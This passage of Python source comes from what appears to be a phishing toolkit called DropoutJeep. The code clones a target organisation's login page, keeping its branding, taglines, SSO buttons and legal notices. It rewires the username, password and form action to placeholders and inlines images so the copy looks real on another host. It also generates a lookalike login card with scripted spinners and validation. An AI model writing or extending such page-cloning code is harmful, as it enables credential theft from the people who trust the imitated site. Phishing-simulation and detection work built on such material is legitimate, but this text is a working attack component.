        "background": background,
    }

    # Override with CSS custom-property colours when available — they are
    # far more likely to be the *intended* brand palette.
    _props = _extract_css_custom_property_colors(css)
    if _props.get("brand"):
        colors["primary"] = _props["brand"]
        logger.debug("Primary colour overridden by --color-brand: %s", _props["brand"])
    if _props.get("brand_dark"):
        colors["secondary"] = _props["brand_dark"]
    if _props.get("page"):
        colors["background"] = _props["page"]
        logger.debug("Background colour overridden by --color-page: %s", _props["page"])

    logger.debug("Extracted colors: %s", colors)
    return colors


def _extract_css_custom_property_colors(css: str) -> Dict[str, str]:
    """Extract brand-relevant colours from CSS custom property declarations.

    Looks for common naming patterns like ``--color-brand``, ``--color-page``,
    ``--color-surface``, etc.  Returns a dict that may include keys:

    * ``brand`` — e.g. ``--color-brand`` / ``--color-primary`` / ``--primary``
    * ``brand_dark`` — e.g. ``--color-brand-dark``
    * ``page`` — e.g. ``--color-page`` / ``--t-page``
    """
    result: Dict[str, str] = {}
    if not css:
        return result

    # --color-brand: #e31b23;
    brand_names = (
        "color-brand", "color-primary", "primary",
        "color-accent", "accent",
    )
    for name in brand_names:
        m = re.search(rf"--{re.escape(name)}\s*:\s*({_RE_COLOR_VALUE.pattern})", css, re.I)
        if m:
            result["brand"] = m.group(1).strip()
            break

    # --color-brand-dark: #b81419;
    m = re.search(rf"--color-brand-dark\s*:\s*({_RE_COLOR_VALUE.pattern})", css, re.I)
    if m:
        result["brand_dark"] = m.group(1).strip()

    # --color-page / --t-page / --color-background / --color-bg
    for name in ("color-page", "t-page", "color-background", "color-bg",
                 "color-surface", "t-surface"):
        m = re.search(rf"--{re.escape(name)}\s*:\s*({_RE_COLOR_VALUE.pattern})", css, re.I)
        if m:
            result["page"] = m.group(1).strip()
            break

    # Resolve var() chains for page background.  Example:
    #   --color-page: var(--t-page);
    #   --t-page: #050507;
    if not result.get("page") and css:
        # Try each page-like property and follow one level of var() indirection.
        for prop_name in ("color-page", "t-page", "color-background", "color-bg"):
            m = re.search(
                rf"--{re.escape(prop_name)}\s*:\s*var\(\s*--([a-zA-Z0-9_-]+)\s*\)",
                css, re.I,
            )
            if m:
                inner = m.group(1)
                # Look up the inner variable.
                m2 = re.search(
                    rf"--{re.escape(inner)}\s*:\s*({_RE_COLOR_VALUE.pattern})",
                    css, re.I,
                )
                if m2:
                    result["page"] = m2.group(1).strip()
                    logger.debug("Resolved --%s -> --%s -> %s", prop_name, inner, result["page"])
                    break

    logger.debug("CSS custom-property colours: %s", result)
    return result


def _extract_colors_from_html(html: str) -> Dict[str, str]:
    """Fallback color extraction from inline ``style`` attributes in HTML."""
    colors: Dict[str, int] = {}
    for m in re.finditer(
        r"(?:color|background(?:-color)?)\s*:\s*(#[0-9a-fA-F]{3,8}|rgb\([^)]+\))",
        html or "",
    ):
        val = m.group(1).strip().lower()
        colors[val] = colors.get(val, 0) + 1
    if not colors:
        return {"primary": "", "secondary": "", "accent": "", "background": ""}
    ranked = sorted(colors, key=colors.get, reverse=True)
    return {
        "primary": ranked[0] if len(ranked) > 0 else "",
        "secondary": ranked[1] if len(ranked) > 1 else "",
        "accent": ranked[2] if len(ranked) > 2 else "",
        "background": ranked[-1] if ranked else "",
    }


def _count_color_values(css: str, pattern: str) -> Dict[str, int]:
    """Count occurrences of color-like values matched by ``pattern`` in ``css``.

    Only hex (``#rgb``/``#rrggbb``/``#rrggbbaa``) and ``rgb()/rgba()`` values are
    tallied; named colors and ``inherit``/``transparent`` are ignored.
    """
    counter: Dict[str, int] = {}
    for m in re.finditer(pattern, css):
        raw = m.group(1).strip()
        for token in re.split(r"\s+", raw):
            token = token.strip().rstrip(",;")
            if not token:
                continue
            if re.match(r"^#[0-9a-fA-F]{3,8}$", token) or re.match(r"^rgba?\([^)]+\)$", token):
                counter[token] = counter.get(token, 0) + 1
    return counter


# --- Page text extraction ----------------------------------------------------


def _hex_to_rgb(hex_color: str) -> Optional[Tuple[int, int, int]]:
    """Convert a hex colour like ``#ef4444`` to ``(239, 68, 68)``.  Returns
    *None* for unparseable input."""
    m = re.match(r"^#([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$", hex_color.strip())
    if not m:
        m = re.match(r"^#([0-9a-fA-F])([0-9a-fA-F])([0-9a-fA-F])$", hex_color.strip())
    if m:
        return (int(m.group(1), 16), int(m.group(2), 16), int(m.group(3), 16))
    return None


def _extract_page_text(html: str) -> Dict[str, str]:
    """Extract human-visible text cues from the target page.

    Returns a dict that *may* contain any of these keys (all values are
    stripped strings; missing keys = not found):

    * ``title`` — ``<title>`` text.
    * ``meta_desc`` — ``<meta name="description">`` content.
    * ``og_title`` / ``og_desc`` — Open Graph title / description.
    * ``headings`` — joined text of the first few ``<h1>``-``<h3>`` tags.
    * ``tagline`` — a short phrase from ``<p>`` or ``<small>`` that looks
      like a corporate tagline (short, uppercase-ish).
    * ``button_text`` — text of a visible ``<button>`` or submit input.
    * ``disclaimer`` — any ``<p>`` that contains legal keywords (e.g.
      "authorized", "prohibited", "logged", "prosecution").
    * ``sso_text`` — text of a button / link that mentions SSO, Azure,
      Okta, or "single sign-on".

    This is best-effort and intended to feed the template builder so it
    never needs hardcoded CyberDome-specific strings.
    """
    result: Dict[str, str] = {}
    if not html:
        return result
    soup = BeautifulSoup(html, "html.parser")

    # <title>
    if soup.title and soup.title.string:
        result["title"] = soup.title.string.strip()

    # <meta> tags
    for meta in soup.find_all("meta"):
        name = (meta.get("name") or "").lower()
        prop = (meta.get("property") or "").lower()
        content = (meta.get("content") or "").strip()
        if not content:
            continue
        if name == "description":
            result["meta_desc"] = content
        elif prop == "og:title":
            result["og_title"] = content
        elif prop == "og:description":
            result["og_desc"] = content

    body = soup.body
    if not body:
        return result

    # Headings (first 3)
    headings: List[str] = []
    for tag in body.find_all(["h1", "h2", "h3"]):
        text = tag.get_text(" ", strip=True)
        if text and len(text) > 1 and text not in headings:
            headings.append(text)
        if len(headings) >= 3:
            break
    if headings:
        result["headings"] = " | ".join(headings)

    # Tagline: a short <p> or <small> that looks like a tagline.
    for tag in body.find_all(["p", "small", "span", "div"]):
        text = tag.get_text(" ", strip=True)
        # Skip very short / very long / legal-looking text.
        if not (5 < len(text) < 120):
            continue
        if any(kw in text.lower() for kw in ("cookie", "authorized", "prohibited",
                                               "copyright", "rights reserved",
                                               "privacy", "terms of")):
            continue
        # Taglines often have uppercase or all-caps patterns.
        upper_ratio = sum(1 for c in text if c.isupper()) / max(len(text), 1)
        if upper_ratio > 0.4:
            result["tagline"] = text
            break
    if "tagline" not in result:
        # Fallback: first short <p>.
        for tag in body.find_all("p"):
            text = tag.get_text(" ", strip=True)
            if 5 < len(text) < 120:
                result["tagline"] = text
                break

    # Button text
    for tag in body.find_all(["button", "input"]):
        if tag.name == "input" and (tag.get("type") or "").lower() != "submit":
            continue
        text = (tag.get("value") or tag.get_text(" ", strip=True)).strip()
        if text and len(text) > 1:
            result["button_text"] = text
            break

    # SSO button / link
    sso_kws = ("sso", "azure", "okta", "single sign-on", "single sign on",
               "microsoft", "google sign", "saml", "oauth", "oidc")
    for tag in body.find_all(["button", "a"]):
        text = tag.get_text(" ", strip=True).lower()
        if any(kw in text for kw in sso_kws):
            result["sso_text"] = tag.get_text(" ", strip=True)
            break

    # Legal disclaimer paragraph
    legal_kws = ("authorized", "prohibited", "logged and monitored",
                 "prosecution", "applicable law", "unauthorized access",
                 "private system")
    for tag in body.find_all(["p", "div", "small"]):
        text = tag.get_text(" ", strip=True)
        if len(text) > 80 and any(kw in text.lower() for kw in legal_kws):
            result["disclaimer"] = text
            break

    logger.debug("Extracted page text: %s",
                 {k: v[:80] for k, v in result.items()})
    return result


# --- Template construction ---------------------------------------------------

def _inline_images(
    html: str,
    base_url: str,
    session: Optional[requests.Session] = None,
) -> str:
    """Convert ``<img src>`` references to base64 data URIs when possible.

    Keeps cloned pages visually intact even when served from a host that cannot
    reach the original image CDN.  Respects size limits and skips external
    trackers / 1x1 pixels.
    """
    if not html:
        return html
    soup = BeautifulSoup(html, "html.parser")
    total = 0
    skipped = 0
    for img in soup.find_all("img"):
        src = (img.get("src") or "").strip()
        if not src or src.startswith("data:"):
            continue
        # Skip likely tracking pixels.
        if any(kw in src.lower() for kw in ("pixel", "tracker", "beacon", "1x1")):
            continue
        abs_url = urljoin(base_url, src)
        data = _fetch_bytes(abs_url, session)
        if not data:
            # Leave original absolute URL as fallback.
            img["src"] = abs_url
            continue
        if len(data) > MAX_INLINED_IMAGE_BYTES:
            img["src"] = abs_url
            skipped += 1
            continue
        if total + len(data) > MAX_INLINED_IMAGES_TOTAL:
            img["src"] = abs_url
            skipped += 1
            continue
        data_uri = _data_uri_for_bytes(data, abs_url)
        if data_uri:
            img["src"] = data_uri
            total += len(data)
    logger.debug("Inlined %d bytes of images (%d skipped/too large)", total, skipped)
    return str(soup)


def _inline_fonts(
    fonts: List[str],
    base_url: str,
    session: Optional[requests.Session] = None,
) -> str:
    """Fetch Google Fonts CSS and inline it, resolving any relative URLs.

    Returns the concatenated CSS string (empty if none available).
    """
    chunks: List[str] = []
    for url in fonts:
        css = _fetch_text(url, session)
        if css:
            css = _resolve_css_urls(css, base_url)
            css = _inline_css_imports(css, base_url)
            chunks.append(css)
    return "\n\n".join(chunks)


def _inline_svg_fill(svg_html: str, color: str) -> str:
    """Best-effort helper to tint a generic SVG placeholder with a brand color."""
    if not svg_html:
        return svg_html
    # Add a fill attribute to the first <path> without one for quick branding.
    return re.sub(
        r"(<path\b(?![^>]*fill=)[^>]*?d=\"[^\"]+\")",
        rf'\1 fill="{_html_mod.escape(color, True)}"',
        svg_html,
        count=1,
    )


def _preserve_original_page(
    html: str,
    base_url: str,
    session: Optional[requests.Session] = None,
) -> Optional[BeautifulSoup]:
    """Try to preserve the target's real login-page DOM instead of rebuilding it.

    Walks up from the detected login form to find a sensible wrapper (card,
    panel, login container), then sanitizes that fragment:

      * strips scripts, iframes, object/embed, meta refresh
      * replaces form action/fields with placeholders
      * resolves relative src/href/action URLs
      * inlines logo-size images as base64 data URIs

    Returns a BeautifulSoup fragment ready to embed, or *None* if the page
    doesn't have a usable login form in its initial markup.
    """
    if not html:
        return None
    soup = BeautifulSoup(html, "html.parser")
    if not soup.body:
        return None

    forms = soup.body.find_all("form")
    if not forms:
        return None

    # Pick the best login form (same scoring as _extract_login_form).
    best_form = None
    best_score = -1
    for form in forms:
        inputs = form.find_all("input")
        types = {inp.get("type", "text").lower() for inp in inputs}
        score = 0
        if "password" in types:
            score += 3
        if "email" in types:
            score += 2
        elif "text" in types:
            score += 1
        if form.find("button") or form.find("input", type="submit"):
            score += 1
        if score > best_score:
            best_score = score
            best_form = form

    if best_form is None or best_score < 2:
        return None

    # Walk up at most 5 ancestors looking for a wrapper that smells like a
    # login card / container.  If none found, use the form's parent.
    wrapper = best_form
    loginish = re.compile(
        r"\b(login|auth|signin|sign-in|credential|session|card|panel|"
        r"container|wrapper|content|main|body)\b",
        re.I,
    )
    for _ in range(5):
        parent = wrapper.find_parent()
        if parent is None or parent.name in ("html", "body"):
            break
        cls = " ".join(parent.get("class", []) or [])
        id_ = parent.get("id", "")
        if loginish.search(f"{cls} {id_}"):
            wrapper = parent
            break
        wrapper = parent

    # Clone so we don't mutate the original parse tree.
    fragment = BeautifulSoup(str(wrapper), "html.parser").find()
    if fragment is None:
        return None

    # Remove active content that could break the clone or leak visitor info.
    for tag in fragment.find_all(["script", "iframe", "object", "embed", "source"]):
        tag.decompose()
    for meta in fragment.find_all("meta"):
        equiv = (meta.get("http-equiv") or "").lower()
        if equiv == "refresh":
            meta.decompose()

    # Replace form wiring with DropoutJeep placeholders.
    form = fragment.find("form") if fragment.name != "form" else fragment
    if form:
        form["action"] = FORM_ACTION_PLACEHOLDER
        form["method"] = form.get("method", "POST")
        for inp in form.find_all("input"):
            t = (inp.get("type") or "text").lower()
            if t == "hidden":
                continue
            if t == "password":
                inp["name"] = PASSWORD_FIELD_PLACEHOLDER
                if inp.get("id"):
                    old_id = inp["id"]
                    inp["id"] = PASSWORD_FIELD_PLACEHOLDER
                    for label in form.find_all("label", attrs={"for": old_id}):
                        label["for"] = PASSWORD_FIELD_PLACEHOLDER
            elif t in ("email", "text", "tel", "number"):
                inp["name"] = USERNAME_FIELD_PLACEHOLDER
                if inp.get("id"):
                    old_id = inp["id"]
                    inp["id"] = USERNAME_FIELD_PLACEHOLDER
                    for label in form.find_all("label", attrs={"for": old_id}):
                        label["for"] = USERNAME_FIELD_PLACEHOLDER

    # Resolve relative URLs, but never rewrite our placeholders.
    placeholders = {FORM_ACTION_PLACEHOLDER, USERNAME_FIELD_PLACEHOLDER, PASSWORD_FIELD_PLACEHOLDER}
    for tag in fragment.find_all(attrs={"src": True}):
        val = tag["src"]
        tag["src"] = val if val in placeholders else urljoin(base_url, val)
    for tag in fragment.find_all(attrs={"href": True}):
        val = tag["href"]
        tag["href"] = val if val in placeholders else urljoin(base_url, val)
    for tag in fragment.find_all(attrs={"action": True}):
        val = tag["action"]
        tag["action"] = val if val in placeholders else urljoin(base_url, val)

    # Inline small images.
    fragment_str = _inline_images(str(fragment), base_url, session)
    fragment = BeautifulSoup(fragment_str, "html.parser").find()

    return fragment


def _build_dynamic_css(primary: str, is_dark: bool) -> str:
    """Return a block of fluid, animated CSS that layers on top of the clone."""
    primary_rgb = _hex_to_rgb(primary) or (37, 99, 235)
    glow = f"rgba({primary_rgb[0]},{primary_rgb[1]},{primary_rgb[2]},0.35)"
    text = "#ffffff" if is_dark else "#111827"
    muted = "#a1a1aa" if is_dark else "#6b7280"
    return f"""
/* DropoutJeep dynamic layer */
@keyframes dj-fade-in {{ from {{ opacity: 0; transform: translateY(12px); }} to {{ opacity: 1; transform: translateY(0); }} }}
@keyframes dj-pulse {{ 0%,100% {{ opacity: 1; }} 50% {{ opacity: .6; }} }}
@keyframes dj-spin {{ to {{ transform: rotate(360deg); }} }}
.dj-animate-in {{ animation: dj-fade-in .55s cubic-bezier(.22,.61,.36,1) both; }}
.dj-delay-1 {{ animation-delay: .08s; }}
.dj-delay-2 {{ animation-delay: .16s; }}
.dj-delay-3 {{ animation-delay: .24s; }}
.dj-spinner {{
  width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.35);
  border-top-color: #fff; border-radius: 50%;
  animation: dj-spin .8s linear infinite; display: none;
}}
.dj-submitting .dj-spinner {{ display: inline-block; }}
.dj-submitting .dj-btn-text {{ opacity: .85; }}
input[type="text"],input[type="email"],input[type="password"],input[type="tel"] {{
  transition: border-color .2s ease, box-shadow .2s ease, transform .15s ease !important;
}}
input[type="text"]:focus,input[type="email"]:focus,input[type="password"]:focus,input[type="tel"]:focus {{
  box-shadow: 0 0 0 3px {glow} !important;
}}
button[type="submit"],input[type="submit"],.dj-button {{
  transition: transform .15s ease, filter .15s ease, box-shadow .2s ease !important;
}}
button[type="submit"]:hover,input[type="submit"]:hover,.dj-button:hover {{
  transform: translateY(-1px) scale(1.01) !important;
  filter: brightness(1.08);
}}
button[type="submit"]:active,input[type="submit"]:active,.dj-button:active {{
  transform: translateY(0) scale(.99) !important;
}}
.dj-toggle-pw {{
  position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
  background: none; border: none; color: {muted}; cursor: pointer; padding: 4px;
}}
.dj-toggle-pw:hover {{ color: {text}; }}
.dj-error {{
  background: {'rgba(239,68,68,.12)' if is_dark else '#fee2e2'};
  color: {'#fca5a5' if is_dark else '#991b1b'};
  padding: 10px 12px; border-radius: 8px; font-size: 13px; margin: 8px 0;
  display: none; animation: dj-fade-in .25s ease;
}}
.dj-error.visible {{ display: block; }}
"""


def _build_dynamic_js() -> str:
    """Return a small JS snippet that adds fluid interactivity to the clone."""
    return """
<script>
(function(){
  function ready(fn){ if(document.readyState!=='loading') fn(); else document.addEventListener('DOMContentLoaded',fn); }
  ready(function(){
    var forms=document.querySelectorAll('form');
    forms.forEach(function(form){
      var submitBtn=form.querySelector('button[type="submit"],input[type="submit"]');
      var spinner=document.createElement('span');
      spinner.className='dj-spinner';
      if(submitBtn && !submitBtn.querySelector('.dj-spinner')){
        var txt=document.createElement('span');
        txt.className='dj-btn-text';
        txt.textContent=submitBtn.textContent||submitBtn.value||'';
        submitBtn.innerHTML='';
        submitBtn.appendChild(txt);
        submitBtn.appendChild(spinner);
      }
      form.addEventListener('submit', function(e){
        var user=form.querySelector('input[type="text"],input[type="email"]');
        var pass=form.querySelector('input[type="password"]');
        var err=form.querySelector('.dj-error') || document.createElement('div');
        if(!form.querySelector('.dj-error')){
          err.className='dj-error';
          form.insertBefore(err, form.firstChild);
        }
        err.classList.remove('visible');
        var missing=[];
        if(user && !user.value.trim()) missing.push('username/email');
        if(pass && !pass.value.trim()) missing.push('password');
        if(missing.length){
          e.preventDefault();
          err.textContent='Please enter your ' + missing.join(' and ') + '.';
          err.classList.add('visible');
          return;
        }
        if(submitBtn) submitBtn.classList.add('dj-submitting');
      });
    });
    // Password visibility toggles.
    document.querySelectorAll('input[type="password"]').forEach(function(pw){
      var wrap=pw.closest('div');
      if(!wrap) return;
      wrap.style.position='relative';
      var btn=document.createElement('button');
      btn.type='button'; btn.className='dj-toggle-pw'; btn.setAttribute('aria-label','Show password');
      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>';
      btn.addEventListener('click',function(){
        pw.type=pw.type==='password'?'text':'password';
        btn.setAttribute('aria-label', pw.type==='password'?'Show password':'Hide password');
      });
      wrap.appendChild(btn);
    });
    // Staggered entrance animation for major containers.
    var anim=[].slice.call(document.querySelectorAll('.dj-animate-in, form, .dj-card, [class*="card"], [class*="panel"], [class*="login"], [class*="auth"]'));
    anim.forEach(function(el,i){ el.style.animationDelay=(i*0.05)+'s'; el.classList.add('dj-animate-in'); });
  });
})();
</script>
"""


def _build_fallback_template(
    html: str = "",
    css: str = "",
    logo_url: str = "",
    favicon_url: str = "",
    colors: Optional[Dict[str, str]] = None,
    theme: str = "unknown",
    fonts: Optional[List[str]] = None,
    base_url: str = "",
) -> str:
    """Build a generated-from-scratch adaptive login card when the original
    page cannot be preserved (SPA, no usable form, etc.).
    """
    colors = colors or {}
    fonts = fonts or []
    is_dark = theme == "dark"

    # ---- colour scheme -------------------------------------------------------
    primary = colors.get("primary") or ("#ef4444" if is_dark else "#2563eb")
    secondary = colors.get("secondary") or ("#dc2626" if is_dark else "#1e40af")
    accent = colors.get("accent") or primary
    raw_bg = colors.get("background") or ""
    # When the "extracted" background colour contradicts the detected theme
    # (e.g. a dark SPA whose CSS variables default to light), discard it.
    if raw_bg and is_dark:
        bg_lum = _relative_luminance(raw_bg)
        if bg_lum is not None and bg_lum > 0.5:
            logger.debug("Discarding light background %s (theme is dark)", raw_bg)
            raw_bg = ""
    page_bg = raw_bg or ("#0a0a0f" if is_dark else "#f3f4f6")

    if is_dark:
        card_bg = "rgba(0,0,0,0.55)"
        card_border = "rgba(255,255,255,0.08)"
        text_color = "#ffffff"
        text_muted = "#a1a1aa"
        text_subtle = "#71717a"
        input_bg = "rgba(255,255,255,0.03)"
        input_border = "rgba(255,255,255,0.06)"
        input_focus_border = "rgba(255,255,255,0.15)"
        input_focus_bg = "rgba(255,255,255,0.05)"
        input_placeholder = "#52525b"
        divider_color = "rgba(255,255,255,0.06)"
        focus_ring = "rgba(239,68,68,0.1)"
        btn_shadow = "rgba(239,68,68,0.3)"
        card_radius = "24px"
        card_shadow = "0 25px 50px rgba(0,0,0,0.4)"
        container_max_w = "1000px"
        title_size = "28px"
        has_blur = "blur" in css.lower()
    else:
        card_bg = "#ffffff"
        card_border = "#e5e7eb"
        text_color = "#1f2937"
        text_muted = "#6b7280"
        text_subtle = "#9ca3af"
        input_bg = "#ffffff"
        input_border = "#d1d5db"
        input_focus_border = primary
        input_focus_bg = "#ffffff"
        input_placeholder = "#9ca3af"
        divider_color = "#e5e7eb"
        focus_ring = "rgba(37,99,235,0.1)"
        btn_shadow = "rgba(37,99,235,0.2)"
        card_radius = "12px"
        card_shadow = "0 10px 25px rgba(0,0,0,0.08), 0 2px 6px rgba(0,0,0,0.04)"
        container_max_w = "440px"
        title_size = "22px"
        has_blur = False

    button_hover_scale = "1.02" if is_dark else "1.01"

    # ---- assets --------------------------------------------------------------
    title = _infer_title(html)
    page_text = _extract_page_text(html)
    brand_name = title or "Sign in"
    for suffix in (" login", " sign in", " | login", " | sign in", " SOC", " — login"):
        if brand_name.lower().endswith(suffix.lower()):
            brand_name = brand_name[: -len(suffix)].strip()

    # Use meta description or OG description as subtitle if available.
    subtitle = (
        page_text.get("meta_desc") or page_text.get("og_desc") or ""
    )
    # Shorten if too long.
    if len(subtitle) > 100:
        subtitle = subtitle[:97].rsplit(" ", 1)[0] + "..."

    # Tagline for left panel (SPA dark layout).
    tagline = page_text.get("tagline") or ""
    heading = page_text.get("headings") or ""
    btn_text = page_text.get("button_text") or "Sign in"
    sso_text = page_text.get("sso_text") or ""
    disclaimer_text = page_text.get("disclaimer") or ""

    logo_src = logo_url or favicon_url or ""
    if logo_src:
        logo_html = f'<img src="{logo_src}" alt="{_html_mod.escape(brand_name, True)}" class="dj-logo" />'
    else:
        logo_html = ""

    # ---- derive focus / shadow from primary colour ---------------------------
    primary_rgb = _hex_to_rgb(primary) or (239, 68, 68)
    focus_ring = f"rgba({primary_rgb[0]},{primary_rgb[1]},{primary_rgb[2]},0.1)"
    btn_shadow = f"rgba({primary_rgb[0]},{primary_rgb[1]},{primary_rgb[2]},0.3)"

    fonts_links = "\n    ".join(f'<link href="{f}" rel="stylesheet">' for f in fonts)

    # ---- form -----------------------------------------------------------------
    extracted_form = _extract_login_form(html, base_url)
    if extracted_form:
        form_inner, _form_class = extracted_form
        form_block = form_inner
    else:
        form_block = (
            '<div class="dj-field">'
            f'<label class="dj-label" for="{USERNAME_FIELD_PLACEHOLDER}">Email or username</label>'
            '<div class="dj-input-wrap">'
            '<svg class="dj-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"/><rect x="2" y="4" width="20" height="16" rx="2"/></svg>'
            f'<input class="dj-input" id="{USERNAME_FIELD_PLACEHOLDER}" name="{USERNAME_FIELD_PLACEHOLDER}" type="text" autocomplete="username" placeholder="you@company.com" required />'
            '</div></div>'
            '<div class="dj-field">'
            f'<label class="dj-label" for="{PASSWORD_FIELD_PLACEHOLDER}">Password</label>'
            '<div class="dj-input-wrap">'
            '<svg class="dj-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'
            f'<input class="dj-input" id="{PASSWORD_FIELD_PLACEHOLDER}" name="{PASSWORD_FIELD_PLACEHOLDER}" type="password" autocomplete="current-password" placeholder="Enter your password" required />'
            '</div></div>'
            '<div class="dj-row">'
            '<label class="dj-checkbox-label"><input type="checkbox" class="dj-checkbox" /><span>Remember me</span></label>'
            '<a class="dj-link" href="#">Forgot password?</a>'
            '</div>'
            f'<button class="dj-button" type="submit">{_html_mod.escape(btn_text, True)}'
            '<svg class="dj-btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>'
            '</button>'
        )

    # ---- sso block (only when detected on target) ---------------------------
    sso_block = ""
    if sso_text:
        sso_block = (
            '<div class="dj-divider"><span>or</span></div>'
            f'<button class="dj-sso-button" type="button" disabled title="SSO is not configured">'
            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="16.5" cy="7.5" r=".5"/><path d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z"/></svg>'
            f'{_html_mod.escape(sso_text, True)}</button>'
        )

    # ---- CSS ------------------------------------------------------------------
    input_pad_left = "14px" if extracted_form else "42px"
    disclaimer_border = "rgba(239,68,68,0.25)" if is_dark else "#fecaca"
    disclaimer_bg = "rgba(239,68,68,0.07)" if is_dark else "#fef2f2"
    disclaimer_text_color = "#e4e4e7" if is_dark else "#7f1d1d"
    disclaimer_icon_color = "#f87171" if is_dark else "#ef4444"
    sora_font = "Sora, " if any("Sora" in f for f in fonts) else ""
    blur_css = "backdrop-filter: blur(24px);" if has_blur else ""

    # Two-panel CSS for dark SPA template
    panel_css = ""
    if is_dark and not extracted_form:
        panel_css = (
            ".dj-panels { display: flex; flex-direction: row; }\n"
            ".dj-panel-left { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 45%; padding: 48px 40px; background: linear-gradient(135deg, rgba(255,255,255,0.02) 0%, transparent 100%); border-right: 1px solid var(--dj-card-border); text-align: center; }\n"
            ".dj-panel-right { flex: 1; padding: 48px 40px; }\n"
            "@media (max-width: 768px) { .dj-panel-left { display: none; } .dj-panel-right { padding: 32px 24px; } }\n"
        )

    footer_year = __import__("datetime").datetime.utcnow().year
    dynamic_css = _build_dynamic_css(primary, is_dark)
    dynamic_js = _build_dynamic_js()

    css_block = f"""\
:root {{
  --dj-primary: {primary};
  --dj-primary-hover: {secondary};
  --dj-accent: {accent};
  --dj-page-bg: {page_bg};
  --dj-card-bg: {card_bg};
  --dj-card-border: {card_border};
  --dj-text: {text_color};
  --dj-text-muted: {text_muted};
  --dj-text-subtle: {text_subtle};
  --dj-input-bg: {input_bg};
  --dj-input-border: {input_border};
  --dj-input-focus-border: {input_focus_border};
  --dj-input-focus-bg: {input_focus_bg};
  --dj-input-text: {text_color};
  --dj-input-placeholder: {input_placeholder};
  --dj-divider: {divider_color};
  --dj-btn-text: #ffffff;
  --dj-btn-hover-scale: {button_hover_scale};
}}
html, body {{
  margin: 0; padding: 0; height: 100%;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  background-color: var(--dj-page-bg); color: var(--dj-text);
  -webkit-font-smoothing: antialiased;
}}
body {{ display: flex; align-items: center; justify-content: center; }}
.dj-container {{ width: 100%; max-width: {container_max_w}; margin: 16px; }}
.dj-card {{
  background: var(--dj-card-bg); border: 1px solid var(--dj-card-border);
  border-radius: {card_radius}; box-shadow: {card_shadow}; overflow: hidden;
  {blur_css}
}}
.dj-panel-right {{}}
.dj-logo {{ max-height: 64px; max-width: 200px; margin: 0 auto 24px; display: block; }}
.dj-brand-name {{ font-size: 32px; font-weight: 800; letter-spacing: -0.03em; margin: 0 0 8px; font-family: {sora_font}sans-serif; }}
.dj-brand-primary {{ color: var(--dj-primary); }}
.dj-brand-secondary {{ color: var(--dj-text); }}
.dj-tagline {{ font-size: 13px; text-transform: uppercase; letter-spacing: 0.2em; color: var(--dj-text-muted); margin: 0 0 32px; }}
.dj-cta-box {{ padding: 20px 24px; border-radius: 16px; border: 1px solid var(--dj-card-border); background: rgba(255,255,255,0.02); text-align: center; }}
.dj-cta-muted {{ font-size: 14px; color: var(--dj-text-muted); margin: 0 0 4px; }}
.dj-cta-strong {{ font-size: 18px; font-weight: 600; color: var(--dj-text); margin: 0; }}
.dj-cta-accent {{ color: var(--dj-primary); font-weight: 700; }}
.dj-title {{ font-size: {title_size}; font-weight: 700; margin: 0 0 6px; color: var(--dj-text); }}
.dj-subtitle {{ font-size: 15px; color: var(--dj-text-muted); margin: 0 0 28px; }}
.dj-form {{ display: flex; flex-direction: column; gap: 16px; }}
.dj-field {{ display: flex; flex-direction: column; gap: 6px; }}
.dj-label {{ font-size: 13px; font-weight: 500; color: var(--dj-text-muted); margin-left: 4px; }}
.dj-input-wrap {{ position: relative; display: flex; align-items: center; }}
.dj-input-icon {{ position: absolute; left: 14px; width: 16px; height: 16px; color: var(--dj-input-placeholder); pointer-events: none; transition: color 0.15s; }}
.dj-input-wrap:focus-within .dj-input-icon {{ color: var(--dj-text-muted); }}
.dj-input {{
  width: 100%; padding: 14px 14px 14px {input_pad_left}; font-size: 15px;
  background: var(--dj-input-bg); border: 1px solid var(--dj-input-border);
  border-radius: 12px; color: var(--dj-input-text); outline: none;
  transition: border-color 0.15s, background 0.15s, box-shadow 0.15s; box-sizing: border-box;
}}
.dj-input::placeholder {{ color: var(--dj-input-placeholder); }}
.dj-input:focus {{ border-color: var(--dj-input-focus-border); background: var(--dj-input-focus-bg); box-shadow: 0 0 0 3px {focus_ring}; }}
.dj-row {{ display: flex; align-items: center; justify-content: space-between; padding-top: 4px; }}
.dj-checkbox-label {{ display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--dj-text-muted); cursor: pointer; user-select: none; }}
.dj-checkbox {{ width: 16px; height: 16px; border-radius: 4px; accent-color: var(--dj-primary); cursor: pointer; }}
.dj-link {{ font-size: 13px; color: var(--dj-text-muted); text-decoration: none; transition: color 0.15s; }}
.dj-link:hover {{ color: var(--dj-text); }}
.dj-button {{
  width: 100%; padding: 14px 16px; font-size: 15px; font-weight: 600;
  color: var(--dj-btn-text); background: linear-gradient(135deg, var(--dj-primary), var(--dj-primary-hover));
  border: none; border-radius: 12px; cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: transform 0.15s, filter 0.15s, box-shadow 0.15s; margin-top: 4px;
}}
.dj-button:hover {{ transform: scale(var(--dj-btn-hover-scale)); filter: brightness(1.1); box-shadow: 0 4px 15px {btn_shadow}; }}
